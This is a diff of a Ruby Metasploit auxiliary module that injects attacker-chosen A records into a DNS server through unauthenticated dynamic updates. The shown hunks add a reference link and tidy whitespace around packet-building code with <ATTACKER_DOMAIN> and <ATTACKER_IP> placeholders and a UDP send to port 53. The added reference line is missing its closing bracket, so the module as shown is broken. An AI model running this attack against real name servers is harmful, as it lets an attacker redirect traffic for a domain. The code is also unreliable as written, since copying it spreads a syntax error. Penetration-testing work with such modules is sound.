@@ -20,6 +20,7 @@ class MetasploitModule < Msf::Auxiliary
             [
                 ['URL', 'http://www.tenable.com/plugins/index.php?view=single&id=35372'],
                 ['URL', 'https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject'],
+                ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/',
                 ['URL', 'https://github.com/ChrisTruncer/PenTestScripts/blob/master/DNSInject.py']
             ],
         'License'        => MSF_LICENSE,
@@ -108,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
         "\x00\x06" +
         #   Class: IN (0x0001)
         "\x00\x01" +
-        
+
         # Updates
         #   <ATTACKER_DOMAIN>: type A, class IN, addr <ATTACKER_DOMAIN>
         #   Name: <ATTACKER_DOMAIN>
@@ -124,7 +125,7 @@ class MetasploitModule < Msf::Auxiliary
         #   Address: <ATTACKER_IP>
         ip_to_hex(attacker_ip)
   end
-  
+
   def send_udp
     datastore['RHOST'] = datastore['NS']
     datastore['RPORT'] = 53
